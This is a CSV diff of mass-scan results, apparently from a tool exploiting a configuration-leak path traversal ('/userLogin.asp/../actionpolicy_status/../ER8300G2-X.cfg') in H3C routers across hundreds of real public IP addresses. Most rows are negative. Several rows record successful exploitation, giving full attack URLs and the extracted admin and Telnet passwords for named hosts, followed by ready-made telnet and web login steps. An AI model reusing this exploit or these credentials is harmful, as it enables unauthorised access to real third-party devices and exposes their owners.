+60.165.203.52,9000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+125.120.25.233,8081,否,配置泄露,,,,,端口未开放，跳过检测
+119.145.133.229,8200,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.155.8.62,8181,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.196.14,8090,否,配置泄露,,,,,端口未开放，跳过检测
+114.247.140.10,18080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+61.185.111.114,8088,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+116.172.199.177,8989,否,配置泄露,,,,,端口未开放，跳过检测
+36.24.202.224,8088,否,配置泄露,,,,,端口未开放，跳过检测
+14.157.165.133,8090,否,配置泄露,,,,,端口未开放，跳过检测
+180.158.123.26,777,否,配置泄露,,,,,端口未开放，跳过检测
+220.188.8.111,8181,否,配置泄露,,,,,端口未开放，跳过检测
+119.136.33.10,10000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+60.177.168.135,8181,否,配置泄露,,,,,端口未开放，跳过检测
+115.206.105.156,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.163.21,8089,否,配置泄露,,,,,端口未开放，跳过检测
+116.232.3.203,33890,否,配置泄露,,,,,端口未开放，跳过检测
+183.158.109.120,9001,否,配置泄露,,,,,端口未开放，跳过检测
+116.25.37.143,9090,否,配置泄露,,,,,端口未开放，跳过检测
+58.42.83.30,8000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+61.169.76.74,12000,否,配置泄露,,,,,端口未开放，跳过检测
+119.136.26.157,1234,是,配置泄露,H3C,Cbwfnypygl1030,Cbwfnypygl1030,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://119.136.26.157:1234/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 172172 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Cbwfnypygl1030 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Cbwfnypygl1030 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: dcf (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 219.134.142.129
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 119.136.26.157 1234
+       密码: Cbwfnypygl1030
+    2. Web登录: http://119.136.26.157:1234/userLogin.asp
+       密码: Cbwfnypygl1030
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+122.234.161.126,82,否,配置泄露,,,,,端口未开放，跳过检测
+182.148.209.126,10010,否,配置泄露,,,,,端口未开放，跳过检测
+220.184.215.153,10001,否,配置泄露,,,,,端口未开放，跳过检测
+115.171.55.170,9443,否,配置泄露,,,,,端口未开放，跳过检测
+14.110.101.97,8989,否,配置泄露,,,,,端口未开放，跳过检测
+182.138.237.14,10010,否,配置泄露,,,,,端口未开放，跳过检测
+61.134.39.138,18080,是,配置泄露,H3C,mxsz@1024,mxsz@1024,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://61.134.39.138:18080/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 165817 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: mxsz@1024 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: mxsz@1024 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: mxsz (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 61.134.1.5
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 61.134.39.138 18080
+       密码: mxsz@1024
+    2. Web登录: http://61.134.39.138:18080/userLogin.asp
+       密码: mxsz@1024
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+116.231.241.233,8800,否,配置泄露,,,,,端口未开放，跳过检测
+124.89.76.10,9050,否,配置泄露,,,,,端口未开放，跳过检测
+220.175.107.27,8181,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.87.80.37,8089,否,配置泄露,,,,,端口未开放，跳过检测
+112.244.139.133,10010,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.16.215,10443,否,配置泄露,,,,,端口未开放，跳过检测
+119.98.154.213,10008,否,配置泄露,,,,,端口未开放，跳过检测
+60.210.192.217,10010,否,配置泄露,,,,,端口未开放，跳过检测
+106.81.32.80,8989,否,配置泄露,,,,,端口未开放，跳过检测
+115.171.55.193,9443,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.238.178,18080,否,配置泄露,,,,,端口未开放，跳过检测
+125.86.136.247,8989,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.224.221,10010,否,配置泄露,,,,,端口未开放，跳过检测
+112.245.53.45,18080,否,配置泄露,,,,,端口未开放，跳过检测
+39.64.90.178,10010,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.82.226,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.16.230,10443,否,配置泄露,,,,,端口未开放，跳过检测
+14.157.167.79,8090,否,配置泄露,,,,,端口未开放，跳过检测
+183.158.104.57,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.234.8,9999,否,配置泄露,,,,,端口未开放，跳过检测
+175.44.129.61,8989,否,配置泄露,,,,,端口未开放，跳过检测
+117.176.131.200,9999,否,配置泄露,,,,,端口未开放，跳过检测
+112.29.86.151,9168,是,配置泄露,H3C,Bxd168,Bxd168,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://112.29.86.151:9168/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 159321 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Bxd168 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Bxd168 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: B (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 211.138.180.2
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 112.29.86.151 9168
+       密码: Bxd168
+    2. Web登录: http://112.29.86.151:9168/userLogin.asp
+       密码: Bxd168
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+125.120.70.100,8181,否,配置泄露,,,,,端口未开放，跳过检测
+27.214.3.27,10010,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.107,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.4.40.191,8081,否,配置泄露,,,,,端口未开放，跳过检测
+112.29.86.161,9168,是,配置泄露,H3C,Bxd168,Bxd168,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://112.29.86.161:9168/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 159321 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Bxd168 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Bxd168 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: B (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 211.138.180.2
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 112.29.86.161 9168
+       密码: Bxd168
+    2. Web登录: http://112.29.86.161:9168/userLogin.asp
+       密码: Bxd168
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+113.80.134.163,4040,否,配置泄露,,,,,端口未开放，跳过检测
+115.210.140.248,8181,否,配置泄露,,,,,端口未开放，跳过检测
+222.93.230.164,10000,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.196.155,8081,否,配置泄露,,,,,端口未开放，跳过检测
+202.96.139.27,8880,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+60.176.75.4,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.132.14,4040,否,配置泄露,,,,,端口未开放，跳过检测
+115.192.162.151,8081,否,配置泄露,,,,,端口未开放，跳过检测
+119.7.174.109,8081,否,配置泄露,,,,,端口未开放，跳过检测
+61.144.189.249,8091,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.44.205,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.19.158,9090,否,配置泄露,,,,,端口未开放，跳过检测
+125.119.88.194,82,否,配置泄露,,,,,端口未开放，跳过检测
+180.165.3.141,8800,否,配置泄露,,,,,端口未开放，跳过检测
+183.134.177.21,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.17.59,9000,否,配置泄露,,,,,端口未开放，跳过检测
+128.14.107.230,9090,否,配置泄露,,,,,端口未开放，跳过检测
+59.57.238.110,9000,否,配置泄露,,,,,端口未开放，跳过检测
+180.102.185.147,60443,否,配置泄露,,,,,端口未开放，跳过检测
+183.156.4.177,9001,否,配置泄露,,,,,端口未开放，跳过检测
+124.72.53.160,9000,否,配置泄露,,,,,端口未开放，跳过检测
+117.84.113.234,9001,否,配置泄露,,,,,端口未开放，跳过检测
+183.158.118.9,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.230.43,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.82.20,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.148.33,4040,否,配置泄露,,,,,端口未开放，跳过检测
+115.192.232.51,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.96.137,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.148.93,4040,否,配置泄露,,,,,端口未开放，跳过检测
+122.234.111.164,9001,否,配置泄露,,,,,端口未开放，跳过检测
+122.234.109.147,9001,否,配置泄露,,,,,端口未开放，跳过检测
+124.72.87.99,9000,否,配置泄露,,,,,端口未开放，跳过检测
+60.208.119.130,10010,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+222.181.10.9,8989,否,配置泄露,,,,,端口未开放，跳过检测
+125.81.233.157,8989,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.151.68,4040,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.231.204,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.150.45,4040,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.80.149,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.102.96,20000,否,配置泄露,,,,,端口未开放，跳过检测
+122.233.149.72,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.100.63,20000,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.234.4,18080,否,配置泄露,,,,,端口未开放，跳过检测
+119.5.139.110,8081,否,配置泄露,,,,,端口未开放，跳过检测
+220.165.137.27,9199,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+120.237.83.109,8000,否,配置泄露,,,,,端口未开放，跳过检测
+123.245.58.41,8088,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.98.252,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.197.37.55,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.69.139.67,8090,否,配置泄露,,,,,端口未开放，跳过检测
+36.24.28.156,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.16.145,10443,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.53,8090,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.227.189,8081,否,配置泄露,,,,,端口未开放，跳过检测
+14.153.226.218,1234,否,配置泄露,,,,,端口未开放，跳过检测
+183.238.229.85,8000,否,配置泄露,,,,,端口未开放，跳过检测
+122.235.142.146,8081,否,配置泄露,,,,,端口未开放，跳过检测
+183.238.229.86,8000,否,配置泄露,,,,,端口未开放，跳过检测
+183.238.222.5,8000,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.152,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.192.164.46,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.139.65,8083,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.17.244,9090,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.253.175,8090,否,配置泄露,,,,,端口未开放，跳过检测
+180.112.66.138,9001,否,配置泄露,,,,,端口未开放，跳过检测
+115.204.215.85,9001,否,配置泄露,,,,,端口未开放，跳过检测
+111.35.39.112,8090,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+218.24.182.160,9096,是,配置泄露,H3C,Ry2022erp0518p,Ry2022erp0518p,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://218.24.182.160:9096/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 159237 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Ry2022erp0518p (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Ry2022erp0518p (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: howareyou (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.96.69.38
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 218.24.182.160 9096
+       密码: Ry2022erp0518p
+    2. Web登录: http://218.24.182.160:9096/userLogin.asp
+       密码: Ry2022erp0518p
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+117.30.75.152,8888,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.230.216,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.80.93,8089,否,配置泄露,,,,,端口未开放，跳过检测
+220.191.56.87,9001,否,配置泄露,,,,,端口未开放，跳过检测
+171.83.99.168,81,否,配置泄露,,,,,端口未开放，跳过检测
+124.72.60.90,9000,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.45.167,9090,否,配置泄露,,,,,端口未开放，跳过检测
+36.27.119.5,82,否,配置泄露,,,,,端口未开放，跳过检测
+27.154.198.245,9000,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.16.123,9000,否,配置泄露,,,,,端口未开放，跳过检测
+123.161.209.5,12000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.80.155.4,4040,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.83.168,8089,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.219.177,18080,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.100.25,20000,否,配置泄露,,,,,端口未开放，跳过检测
+183.129.38.17,10001,否,配置泄露,,,,,端口未开放，跳过检测
+58.208.150.38,10000,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.228.70,8089,否,配置泄露,,,,,端口未开放，跳过检测
+122.5.41.178,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.101.39,20000,否,配置泄露,,,,,端口未开放，跳过检测
+183.238.222.6,8000,否,配置泄露,,,,,端口未开放，跳过检测
+218.18.22.101,9999,否,配置泄露,,,,,端口未开放，跳过检测
+125.120.181.2,8081,否,配置泄露,,,,,端口未开放，跳过检测
+117.187.80.72,8080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+116.4.41.121,8081,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.196.239,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.199.129.82,8081,否,配置泄露,,,,,端口未开放，跳过检测
+112.194.133.104,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.150.53,4040,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.97.228,8090,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.254.226,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.227.111.120,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.119.160.70,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.143.83,8083,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.96.152,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.171.54.133,9443,否,配置泄露,,,,,端口未开放，跳过检测
+122.242.203.39,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.132.60,8083,否,配置泄露,,,,,端口未开放，跳过检测
+113.111.244.176,999,否,配置泄露,,,,,端口未开放，跳过检测
+115.206.195.74,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.119.161.81,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.19.66,9090,否,配置泄露,,,,,端口未开放，跳过检测
+171.83.102.101,81,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.226.77,8081,否,配置泄露,,,,,端口未开放，跳过检测
+59.57.163.192,9000,否,配置泄露,,,,,端口未开放，跳过检测
+125.77.242.113,9000,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.44.200,9090,否,配置泄露,,,,,端口未开放，跳过检测
+1.192.45.92,9000,否,配置泄露,,,,,端口未开放，跳过检测
+117.28.132.185,8888,否,配置泄露,,,,,端口未开放，跳过检测
+115.206.251.176,82,否,配置泄露,,,,,端口未开放，跳过检测
+182.150.27.166,12000,是,配置泄露,H3C,tojoy-cdfgs,tojoy-cdfgs,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://182.150.27.166:12000/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 155419 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: tojoy-cdfgs (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: tojoy-cdfgs (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 61.139.2.69
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 182.150.27.166 12000
+       密码: tojoy-cdfgs
+    2. Web登录: http://182.150.27.166:12000/userLogin.asp
+       密码: tojoy-cdfgs
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+122.235.225.147,9001,否,配置泄露,,,,,端口未开放，跳过检测
+218.81.143.129,8800,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.134.126,4040,否,配置泄露,,,,,端口未开放，跳过检测
+106.81.205.251,8989,否,配置泄露,,,,,端口未开放，跳过检测
+103.208.12.194,8089,否,配置泄露,,,,,未检测到配置泄露漏洞
+60.176.219.147,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.231.180,8089,否,配置泄露,,,,,端口未开放，跳过检测
+14.220.236.92,4040,否,配置泄露,,,,,端口未开放，跳过检测
+49.84.137.73,10000,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.255.32,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.81.84,8089,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.99.128,8090,否,配置泄露,,,,,端口未开放，跳过检测
+119.5.138.98,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.171.53.62,9443,否,配置泄露,,,,,端口未开放，跳过检测
+113.111.245.161,999,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.100.72,20000,否,配置泄露,,,,,端口未开放，跳过检测
+221.225.236.211,10000,否,配置泄露,,,,,端口未开放，跳过检测
+218.18.22.194,9999,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.103.225,20000,否,配置泄露,,,,,端口未开放，跳过检测
+218.2.153.34,18080,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.83.65,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.230.218,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.16.109,10443,否,配置泄露,,,,,端口未开放，跳过检测
+220.184.71.85,10001,否,配置泄露,,,,,端口未开放，跳过检测
+180.112.194.81,10001,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.202.228,18080,否,配置泄露,,,,,端口未开放，跳过检测
+180.109.12.54,9999,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.111,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.237.67.115,8020,否,配置泄露,,,,,端口未开放，跳过检测
+125.117.128.219,8181,否,配置泄露,,,,,端口未开放，跳过检测
+36.20.60.82,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.119.161.12,8181,否,配置泄露,,,,,端口未开放，跳过检测
+183.153.66.207,8081,否,配置泄露,,,,,端口未开放，跳过检测
+122.233.187.164,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.255.30,8090,否,配置泄露,,,,,端口未开放，跳过检测
+49.77.39.220,60443,否,配置泄露,,,,,端口未开放，跳过检测
+175.155.134.72,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.137.110,8083,否,配置泄露,,,,,端口未开放，跳过检测
+61.156.228.24,6060,否,配置泄露,,,,,端口未开放，跳过检测
+27.154.196.55,9000,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.131.207,4040,否,配置泄露,,,,,端口未开放，跳过检测
+125.81.232.155,8989,否,配置泄露,,,,,端口未开放，跳过检测
+119.39.244.36,9099,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+58.37.34.103,8800,否,配置泄露,,,,,端口未开放，跳过检测
+115.171.52.91,9443,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.82.55,8089,否,配置泄露,,,,,端口未开放，跳过检测
+110.178.145.73,8841,否,配置泄露,,,,,端口未开放，跳过检测
+180.108.215.217,10000,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.229.21,8089,否,配置泄露,,,,,端口未开放，跳过检测
+14.155.219.109,1234,否,配置泄露,,,,,端口未开放，跳过检测
+110.178.145.194,8841,否,配置泄露,,,,,端口未开放，跳过检测
+180.165.13.99,18080,否,配置泄露,,,,,端口未开放，跳过检测
+180.109.12.56,9999,否,配置泄露,,,,,端口未开放，跳过检测
+60.10.218.170,7070,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.156.72.108,10001,否,配置泄露,,,,,端口未开放，跳过检测
+222.90.10.187,1201,否,配置泄露,,,,,端口未开放，跳过检测
+124.160.227.246,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.103.227,20000,否,配置泄露,,,,,端口未开放，跳过检测
+14.220.255.97,4040,否,配置泄露,,,,,端口未开放，跳过检测
+183.148.159.233,50000,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.100.252,20000,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.144.104,8000,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.226.168,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.198.72.123,8081,否,配置泄露,,,,,端口未开放，跳过检测
+125.113.174.38,8181,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.253.246,8090,否,配置泄露,,,,,端口未开放，跳过检测
+120.234.168.84,8088,否,配置泄露,,,,,端口未开放，跳过检测
+113.81.251.10,8819,否,配置泄露,,,,,端口未开放，跳过检测
+113.81.251.120,8819,否,配置泄露,,,,,端口未开放，跳过检测
+113.81.251.134,8819,否,配置泄露,,,,,端口未开放，跳过检测
+112.194.141.148,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.207.74,8819,否,配置泄露,,,,,端口未开放，跳过检测
+59.34.28.246,8083,否,配置泄露,,,,,端口未开放，跳过检测
+115.227.190.199,8181,否,配置泄露,,,,,端口未开放，跳过检测
+14.220.240.136,4040,否,配置泄露,,,,,端口未开放，跳过检测
+110.170.101.18,8080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+125.95.197.150,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.69.139.180,8090,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.96.61,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.195.195.35,8081,否,配置泄露,,,,,端口未开放，跳过检测
+110.249.150.218,8666,是,配置泄露,H3C,zn1989,zn1989,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://110.249.150.218:8666/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 162556 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D025
+  📋 提取的敏感信息:
+    🔑 Web管理密码: zn1989 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: zn1989 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 19 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.99.160.68
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 110.249.150.218 8666
+       密码: zn1989
+    2. Web登录: http://110.249.150.218:8666/userLogin.asp
+       密码: zn1989
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+125.95.197.117,8090,否,配置泄露,,,,,端口未开放，跳过检测
+106.122.206.8,9000,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.19.183,9090,否,配置泄露,,,,,端口未开放，跳过检测
+122.233.146.22,82,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.80.107,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.229.89,8089,否,配置泄露,,,,,端口未开放，跳过检测
+115.238.57.46,8089,否,配置泄露,,,,,端口未开放，跳过检测
+115.196.0.199,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.19.231,9090,否,配置泄露,,,,,端口未开放，跳过检测
+221.10.195.240,6000,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.81.159,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.18.65,10443,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.228.248,8089,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.203.66,18080,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.232.176,9999,否,配置泄露,,,,,端口未开放，跳过检测
+121.34.62.215,20000,否,配置泄露,,,,,端口未开放，跳过检测
+180.165.12.6,18080,否,配置泄露,,,,,端口未开放，跳过检测
+180.112.192.210,10001,否,配置泄露,,,,,端口未开放，跳过检测
+117.43.81.108,8088,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.255.168,8090,否,配置泄露,,,,,端口未开放，跳过检测
+60.186.245.138,8181,否,配置泄露,,,,,端口未开放，跳过检测
+116.237.66.146,8020,否,配置泄露,,,,,端口未开放，跳过检测
+123.245.58.27,8088,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.145.203,8000,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.145.145,8000,否,配置泄露,,,,,端口未开放，跳过检测
+115.171.52.57,9443,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.138.235,8083,否,配置泄露,,,,,端口未开放，跳过检测
+115.205.168.75,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.210.142.202,8181,否,配置泄露,,,,,端口未开放，跳过检测
+220.191.109.209,8081,否,配置泄露,,,,,端口未开放，跳过检测
+119.98.69.87,8899,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.125,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.88.74.21,9000,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.44.78,9090,否,配置泄露,,,,,端口未开放，跳过检测
+49.76.33.16,9001,否,配置泄露,,,,,端口未开放，跳过检测
+106.122.174.18,8888,否,配置泄露,,,,,端口未开放，跳过检测
+115.192.91.99,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.80.60,8089,否,配置泄露,,,,,端口未开放，跳过检测
+122.226.172.70,50000,否,配置泄露,,,,,端口未开放，跳过检测
+117.159.97.113,8888,否,配置泄露,,,,,端口未开放，跳过检测
+58.220.129.202,4321,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.116.44.171,9090,否,配置泄露,,,,,端口未开放，跳过检测
+183.6.79.239,888,否,配置泄露,,,,,端口未开放，跳过检测
+36.22.235.202,9001,否,配置泄露,,,,,端口未开放，跳过检测
+114.224.74.31,9001,否,配置泄露,,,,,端口未开放，跳过检测
+14.220.255.6,4040,否,配置泄露,,,,,端口未开放，跳过检测
+171.39.78.47,55555,否,配置泄露,,,,,端口未开放，跳过检测
+113.88.14.200,8089,否,配置泄露,,,,,端口未开放，跳过检测
+114.216.77.234,10000,否,配置泄露,,,,,端口未开放，跳过检测
+116.237.9.177,8020,否,配置泄露,,,,,端口未开放，跳过检测
+116.31.233.1,9999,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.16.171,10443,否,配置泄露,,,,,端口未开放，跳过检测
+183.159.203.109,10001,否,配置泄露,,,,,端口未开放，跳过检测
+106.37.149.16,9443,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.196.101,8090,否,配置泄露,,,,,端口未开放，跳过检测
+220.178.57.22,8008,否,配置泄露,,,,,端口未开放，跳过检测
+60.186.240.153,8181,否,配置泄露,,,,,端口未开放，跳过检测
+220.184.162.199,8081,否,配置泄露,,,,,端口未开放，跳过检测
+14.157.165.227,8090,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.226.53,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.65.4.177,8090,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.212.231,18080,否,配置泄露,,,,,未检测到配置泄露漏洞
